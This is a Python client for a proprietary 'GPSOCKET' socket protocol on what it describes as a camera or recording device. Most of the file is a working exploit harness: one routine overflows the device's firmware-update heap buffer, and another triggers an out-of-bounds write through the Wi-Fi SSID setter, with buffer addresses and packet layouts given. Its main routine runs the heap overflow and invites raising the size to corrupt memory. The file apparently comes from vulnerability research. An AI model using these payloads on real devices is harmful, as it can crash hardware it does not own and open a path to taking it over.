#!/usr/bin/env python3
"""
GPSOCKET Protocol Client
Interacts with a socket command service handler (likely a camera/recording device)
"""

import socket
import struct
import time
from typing import Tuple, Optional
import xml.dom.minidom

# ── ANSI colours — markers only ────────────────────────────────────────────────
G0  = '\033[38;5;220m'
AMB = '\033[38;5;136m'
GRN = '\033[38;5;34m'
RED = '\033[38;5;160m'
RST = '\033[0m'

class GPSocketClient:
    """Client for GPSOCKET protocol communication"""
    
    MAGIC = b"GPSOCKET"

    CMD_GET_INFO = 0x2

    CMD_SET_THING = 0x401

    CMD_FW_INIT  = 0x0500  # declare total_size + expected_checksum, device mallocs 0x200000
    CMD_FW_CHUNK = 0x0501  # u16-LE chunk_size at payload[0:2], data at payload[2:]
    CMD_FW_DONE  = 0x0501  # chunk_size == 0 signals end-of-transfer; triggers checksum check
    CMD_FW_APPLY = 0x0502  # verify + flash (only reached if checksum matched)

    # Response status codes
    STATUS_SUCCESS = 2
    STATUS_ERROR = 3
    
    def __init__(self, host: str = "192.168.25.1", port: int = 8081, timeout: int = 5,
                 verbose: bool = False):
        """Initialize the client"""
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.sock = None
        
    def connect(self) -> bool:
        """Connect to the device"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            print(f"  {GRN}[+]{RST}  Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"  {RED}[-]{RST}  Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from the device"""
        if self.sock:
            try:
                self.sock.close()
                print(f"  {GRN}[+]{RST}  Disconnected")
            except:
                pass
            self.sock = None
    
    def build_packet(self, command_id: int, payload: bytes = b"") -> bytes:
        """
        Build a GPSOCKET protocol packet
        
        Format:
        - 8 bytes: Magic "GPSOCKET"
        - 2 bytes: Command ID (little-endian)
        - N bytes: Payload
        """
        packet = self.MAGIC
        packet += struct.pack(">H", 0x100)
        packet += struct.pack(">H", command_id)  # Little-endian 16-bit command
        packet += payload
        return packet
    
    def receive_all_data(self, duration: float = 5.0) -> bytes:
        """
        Receive all data for a specified duration
        
        Args:
            duration: Time in seconds to keep receiving data
            
        Returns:
            All received data concatenated
        """
        if not self.sock:
            print(f"  {RED}[-]{RST}  Not connected")
            return b""

        # Set socket to non-blocking for the duration-based receive
        self.sock.setblocking(False)

        all_data = b""
        start_time = time.time()

        print(f"  {AMB}[*]{RST}  Receiving data for {duration} seconds...")
        
        try:
            while time.time() - start_time < duration:
                try:
                    chunk = self.sock.recv(4096)
                    if chunk:
                        all_data += chunk
                        print(f"  {AMB}[*]{RST}  Received chunk of {len(chunk)} bytes")
                    else:
                        # Connection closed
                        break
                except socket.error:
                    # No data available, sleep briefly
                    time.sleep(0.1)
                    
        finally:
            # Restore blocking mode
            self.sock.setblocking(True)
        
        print(f"  {AMB}[*]{RST}  Total received: {len(all_data)} bytes")
        return all_data
    
    def send_command(self, command_id: int, payload: bytes = b"", receive_duration: float = 0,
                     fire_and_forget: bool = False) -> Optional[bytes]:
        """
        Send a command and receive response
        
        Args:
            command_id: Command ID to send
            payload: Command payload
            receive_duration: If > 0, receive data for this many seconds instead of single recv
        """
        if not self.sock:
            print(f"  {RED}[-]{RST}  Not connected")
            return None

        try:
            packet = self.build_packet(command_id, payload)
            if self.verbose:
                print(f"  {AMB}[*]{RST}  Sending command 0x{command_id:04X}, packet length: {len(packet)} bytes")
                print(f"       Packet: {packet.hex()}")

            self.sock.sendall(packet)

            if fire_and_forget:
                return None

            # Receive response
            if receive_duration > 0:
                response = self.receive_all_data(receive_duration)
            else:
                response = self.sock.recv(2048)
                if self.verbose:
                    print(f"  {AMB}[*]{RST}  Received {len(response)} bytes")

            if response and self.verbose:
                print(f"       Response (hex): {response.hex()}")

            return response

        except socket.timeout:
            print(f"  {RED}[-]{RST}  Timeout waiting for response")
            return None
        except Exception as e:
            print(f"  {RED}[-]{RST}  Error: {e}")
            return None
    
    def parse_response(self, response: bytes) -> Tuple[Optional[int], Optional[bytes]]:
        """
        Parse a response packet
        
        Returns: (result_code, payload)
        """
        if not response or len(response) < 10:
            return None, None
        
        # The response format appears to be:
        # 0-7: Magic header (may be slightly different, like "GPSOKET")
        # 8: Status type (2=success, 3=error)
        # 9: Unknown
        # 10-11: Command echo or result related
        # 12-13: Result code
        # 14+: Payload
        
        result_code = struct.unpack(">H", response[8:10])[0] if len(response) >= 10 else None
        payload = response[10:] if len(response) > 10 else b""
        
        return result_code, payload
    
    def pretty_print_xml(self, xml_data: bytes):
        """Pretty print XML data"""
        try:
            # Try to decode as UTF-8
            xml_str = xml_data.decode('utf-8')
            # Parse and pretty print
            dom = xml.dom.minidom.parseString(xml_str)
            pretty_xml = dom.toprettyxml(indent="  ")
            print(f"\n  {AMB}[*]{RST}  XML Payload (pretty printed):")
            print("=" * 60)
            print(pretty_xml)
            print("=" * 60)
        except Exception as e:
            print(f"  {RED}[-]{RST}  Failed to parse XML: {e}")
            print(f"  {AMB}[*]{RST}  Raw payload (attempting UTF-8 decode):")
            try:
                print(xml_data.decode('utf-8', errors='replace'))
            except:
                print(f"       {xml_data.hex()}")
    
    # High-level command methods
    
    def get_info(self) -> Optional[bytes]:
        """Get device information"""
        print(f"\n  {AMB}[*]{RST}  Getting device information...")
        response = self.send_command(self.CMD_GET_INFO, receive_duration=5.0)

        if response:
            result, payload = self.parse_response(response)
            result_str = f"0x{result:04X}" if result is not None else "None"
            print(f"  {AMB}[*]{RST}  Status: {result_str}")
            if payload:
                self.pretty_print_xml(payload)
        return response


    def fw_overflow_fuzz(self, overflow_by: int = 0x1000, chunk_size: int = 0x7F0, inter_chunk_delay: float = 0.0) -> None:
        """
        Test firmware update handler for heap overflow.

        The device mallocs exactly 0x200000 bytes for the firmware buffer in CMD_FW_INIT.
        CMD_FW_CHUNK writes into that buffer with memcpy() using the caller-supplied
        chunk_size — no bounds check exists. Sending more than 0x200000 bytes total
        overflows the heap allocation.

        A deliberately wrong checksum is sent in CMD_FW_INIT so that even if the
        transfer completes cleanly, CMD_FW_APPLY will NAK and the firmware won't flash.

        Args:
            overflow_by:  How many bytes past 0x200000 to send (default 4 KiB)
            chunk_size:   Bytes of payload per 0x501 packet (max ~0x7F2 given 0x800 recv buf)
        """
        HEAP_ALLOC = 0x200000
        total_to_send = HEAP_ALLOC + overflow_by

        # Wrong checksum — prevents CMD_FW_APPLY from actually flashing anything.
        bad_checksum = 0xDEADBEEF

        print(f"\n  {AMB}[*]{RST}  Firmware overflow fuzz")
        print(f"       Heap allocation : 0x{HEAP_ALLOC:08X} ({HEAP_ALLOC // 1024} KiB)")
        print(f"       Total to send   : 0x{total_to_send:08X} (overflow by 0x{overflow_by:X})")
        print(f"       Chunk size      : 0x{chunk_size:X}")
        print(f"       Bad checksum    : 0x{bad_checksum:08X}  (prevents flash write)")

        # --- 0x0500 INIT ---
        # recv_buffer[0xc..0x10] = total_size (u32 LE)
        # recv_buffer[0x10..0x14] = expected_checksum (u32 LE)
        init_payload = struct.pack("<II", total_to_send, bad_checksum)
        print(f"\n  {AMB}[*]{RST}  Sending CMD_FW_INIT (0x0500) — declaring size=0x{total_to_send:X}")
        resp = self.send_command(self.CMD_FW_INIT, init_payload)
        if resp is None:
            print(f"  {RED}[-]{RST}  No response to INIT — aborting")
            return

        # Response byte[8] == 2 → success (RESP_CODE_FW_READY), byte[8] == 3 → error
        if len(resp) >= 9 and resp[8] != self.STATUS_SUCCESS:
            print(f"  {RED}[-]{RST}  INIT rejected (status byte=0x{resp[8]:02X}) — aborting")
            return
        print(f"  {GRN}[+]{RST}  INIT accepted, device allocated 0x{HEAP_ALLOC:X}-byte heap buffer")

        # --- 0x0501 CHUNK loop ---
        # payload[0:2] = chunk_size (u16 LE)   → lands at recv_buffer[0xc:0xe]
        # payload[2:]  = chunk data             → copied from recv_buffer[0xe:] (PTR_DAT_00019968)
        bytes_sent = 0
        chunk_data = b"\xCC" * chunk_size  # 0xCC = recognisable pattern in memory dumps
        packet_count = 0

        print(f"\n  {AMB}[*]{RST}  Sending CMD_FW_CHUNK (0x0501) packets...")
        while bytes_sent < total_to_send:
            this_chunk = min(chunk_size, total_to_send - bytes_sent)
            chunk_payload = struct.pack("<H", this_chunk) + chunk_data[:this_chunk]
            resp = self.send_command(self.CMD_FW_CHUNK, chunk_payload)
            packet_count += 1
            bytes_sent += this_chunk

            if inter_chunk_delay > 0:
                time.sleep(inter_chunk_delay)

            if resp is None:
                print(f"  {RED}[-]{RST}  No response after {bytes_sent:#x} bytes — device may have crashed")
                return

            status = resp[8] if len(resp) >= 9 else 0xFF
            if status != self.STATUS_SUCCESS:
                print(f"  {RED}[-]{RST}  Chunk NAK at offset 0x{bytes_sent - this_chunk:X} "
                      f"(status=0x{status:02X}) after {packet_count} packets")
                return

            if bytes_sent <= HEAP_ALLOC:
                print(f"       [{packet_count:4d}] 0x{bytes_sent:08X} / 0x{HEAP_ALLOC:X} "
                      f"({100*bytes_sent//HEAP_ALLOC:3d}%) — within bounds")
            else:
                overflow_amount = bytes_sent - HEAP_ALLOC
                print(f"       [{packet_count:4d}] *** OVERFLOWED by 0x{overflow_amount:X} bytes ***")

        # --- 0x0501 with chunk_size == 0 → signals end-of-transfer ---
        # Device will check bytes_received == total_size then verify checksum.
        # Because bad_checksum won't match, it frees the buffer rather than flashing.
        print(f"\n  {AMB}[*]{RST}  Sending finish packet (chunk_size=0) to trigger checksum check")
        finish_payload = struct.pack("<H", 0)
        resp = self.send_command(self.CMD_FW_CHUNK, finish_payload)
        if resp:
            status = resp[8] if len(resp) >= 9 else 0xFF
            ecode = struct.unpack("<H", resp[12:14])[0] if len(resp) >= 14 else 0xFFFF
            print(f"  {AMB}[*]{RST}  Finish response: status=0x{status:02X} error_code=0x{ecode:04X}")
            if status == self.STATUS_ERROR:
                print(f"  {GRN}[+]{RST}  Device returned error (expected — checksum mismatch or size mismatch)")
        else:
            print(f"  {RED}[-]{RST}  No response to finish packet — device may have crashed during checksum walk")

    def ssid_oob_write(self, length: int = 0xFF, content: bytes = b"") -> Optional[bytes]:
        """
        Trigger OOB write in set_wifi_creds via the SSID handler (ID=0x300, cmd=0x0401).

        The SSID buffer is a fixed 32-byte global at 0x002B400C.
        recv_buffer[0x10] controls how many bytes are written — no bounds check.
        recv_buffer[0x11:] is the data written verbatim into the buffer and beyond.

        Setting length > 32 overflows into 0x002B402C onwards, up to 223 bytes past
        the allocation with length=0xFF.

        Args:
            length:  Byte written to recv_buffer[0x10]. Max useful value 0xFF.
            content: Data to write. Padded with 0xCC if shorter than length.
                     Only bytes [0:length] are used (loop reads recv_buffer[0x11:0x11+length]).
        """
        SSID_BUF_ADDR = 0x002B400C
        SSID_BUF_SIZE = 0x20

        if length > 0xFF:
            print(f"  {RED}[-]{RST}  length capped at 0xFF (byte field)")
            length = 0xFF

        overflow = max(0, length - SSID_BUF_SIZE)
        print(f"\n  {AMB}[*]{RST}  SSID OOB write")
        print(f"       SSID buffer : 0x{SSID_BUF_ADDR:08X} ({SSID_BUF_SIZE} bytes)")
        print(f"       Write length: {length} bytes (overflow by {overflow})")
        print(f"       Overflow dst: 0x{SSID_BUF_ADDR + SSID_BUF_SIZE:08X} – "
              f"0x{SSID_BUF_ADDR + length:08X}")

        data = (content + b"\xCC" * length)[:length]

        # recv_buffer layout:
        #   [0x00:0x08] magic         — built by send_command via build_packet
        #   [0x08:0x0a] direction     — 0x0100
        #   [0x0a:0x0c] cmd           — 0x0401
        #   [0x0c:0x10] ID = 0x300   — selects SSID handler in set_wifi_creds
        #   [0x10]      length        — controls loop iteration count (OOB trigger)
        #   [0x11:]     SSID content  — written to 0x002B400C + i
        payload  = struct.pack("<I", 0x300)   # ID at recv_buffer[0xc]
        payload += struct.pack("B", length)    # length at recv_buffer[0x10]
        payload += data                        # content at recv_buffer[0x11:]

        resp = self.send_command(0x0401, payload)
        if resp is None:
            print(f"  {RED}[-]{RST}  No response — device may have crashed")
            return None

        status = resp[8] if len(resp) >= 9 else 0xFF
        print(f"  {AMB}[*]{RST}  Response status: 0x{status:02X} "
              f"({'success' if status == self.STATUS_SUCCESS else 'error/crash'})")
        return resp

    def set_thing(self) -> Optional[bytes]:
        """Set thing command"""
        print(f"\n  {AMB}[*]{RST}  Setting thing...")

        ting_id = 0x0
        value = 0x3

        payload = struct.pack('<iBB', ting_id, 0x1, value)

        response = self.send_command(self.CMD_SET_THING, payload)

        if response:
            result, payload = self.parse_response(response)
            result_str = f"0x{result:04X}" if result is not None else "None"
            print(f"  {AMB}[*]{RST}  Status: {result_str}")
            if payload:
                print(f"       Payload: {payload.hex(' ')}")
        return response
    

def main():
    """Example usage"""
    print("=" * 60)
    print("GPSOCKET Protocol Client")
    print("=" * 60)
    
    client = GPSocketClient(host="192.168.25.1", port=8081)
    
    if not client.connect():
        return
    
    try:
        # Try some basic commands
        print("\n" + "=" * 60)
        print("Testing Basic Commands")
        print("=" * 60)
        
        # Increase overflow_by until you hit something interesting on the heap.
        # Smaller chunk_size reduces TCP coalescing (skip cmd messages).
        client.fw_overflow_fuzz(overflow_by=0x2000000, chunk_size=0x200)
        time.sleep(0.5)
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    finally:
        client.disconnect()


if __name__ == "__main__":
    main()